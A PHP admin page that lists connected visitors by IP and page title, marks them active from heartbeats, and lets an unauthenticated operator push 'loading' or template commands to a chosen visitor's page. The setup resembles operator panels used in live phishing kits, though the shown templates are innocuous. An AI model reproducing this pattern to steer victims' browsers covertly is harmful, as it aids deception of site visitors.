<?php
if (isset($_POST['command']) && isset($_POST['ip'])) {
    $command = $_POST['command'];
    $ip = $_POST['ip'];
    $htmlContent = isset($_POST['htmlContent']) ? $_POST['htmlContent'] : '';

    // Extract just the IP address if IP and title are combined
    $ipOnly = explode(' - ', $ip)[0];

    // Store the command for the specific IP, include HTML content if provided
    $commands = json_decode(file_get_contents('commands.json'), true);
    $commands[$ipOnly] = ['command' => $command, 'htmlContent' => $htmlContent];
    file_put_contents('commands.json', json_encode($commands));

    // Instead of echoing, return a response that can be handled by AJAX
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Command sent.']);
    exit;
}

$currentUserFile = 'current_users.txt';
$users = explode("\n", file_get_contents($currentUserFile));
$users = array_filter($users);

echo "Connected Users:<br>";
$heartbeats = json_decode(file_get_contents('heartbeats.json'), true);

foreach ($users as $user) {
	
    list($ip, $title) = array_pad(explode(' - ', $user, 2), 2, 'Unknown Page'); // Handle missing titles gracefully
	    $isActive = isset($heartbeats[$ip]) && time() - $heartbeats[$ip] <= 2; // Check if active in the last 15 seconds
    echo "<span style='color:" . ($isActive ? 'green' : 'red') . "'>" . htmlspecialchars($ip) . ' - ' . htmlspecialchars($title) . "</span><br>";

    echo htmlspecialchars($ip) . ' - ' . htmlspecialchars($title) . "<br>";
    echo "<form class='commandForm'><input type='hidden' name='ip' value='" . htmlspecialchars($ip) . "'>
    <select name='command'>
        <option value='showLoading'>Loading</option>
        <option value='showTemplate'>Template</option>
    </select>
    <select name='template' style='display:none;'>
        <option value=''>Select Template...</option>
        <optgroup label='Vehicles'>
            <option value='cars'>Cars</option>
            <!-- Add more vehicle-related templates here -->
        </optgroup>
        <optgroup label='Media'>
            <option value='video'>Video</option>
            <option value='camera'>Camera</option>
            <!-- Add more media-related templates here -->
        </optgroup>
        <optgroup label='Nature'>
            <option value='animals'>Animals</option>
            <option value='nature'>Nature</option>
            <!-- Add more nature-related templates here -->
        </optgroup>
        <optgroup label='Custom Templates'>
            <option value='template1'>Template1</option>
            <option value='template2'>Template2</option>
            <option value='template3'>Template3</option>
            <!-- Add more custom templates here -->
        </optgroup>
    </select>
    <button type='button' onclick='sendCommand(this)'>Send Command</button></form>";
}
?>

<script>
document.addEventListener('DOMContentLoaded', function() {
    function updateFormDisplay(form) {
        var commandSelect = form.querySelector("select[name='command']");
        var templateSelect = form.querySelector("select[name='template']");
        templateSelect.style.display = commandSelect.value === 'showTemplate' ? 'inline' : 'none';
    }

    document.querySelectorAll("select[name='command']").forEach(function(selectElement) {
        selectElement.addEventListener('change', function() {
            updateFormDisplay(this.closest('form'));
        });
    });

    window.sendCommand = function(buttonElement) {
        var form = buttonElement.closest('form');
        var formData = new FormData(form);
        var commandSelect = form.querySelector("select[name='command']");
        var ipInput = form.querySelector("input[name='ip']");

        // Use the IP input for command identification
        formData.set('ip', ipInput.value);

        if (commandSelect.value === 'showTemplate') {
            var templateSelect = form.querySelector("select[name='template']");
            formData.set('htmlContent', templateSelect.options[templateSelect.selectedIndex].text);
        }

        fetch('admin.php', {
            method: 'POST',
            body: formData,
        })
        .then(response => response.json())
        .then(data => {
            alert(data.message);
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred');
        });
    };

    document.querySelectorAll('.commandForm').forEach(function(form) {
        updateFormDisplay(form);
    });
});
</script>
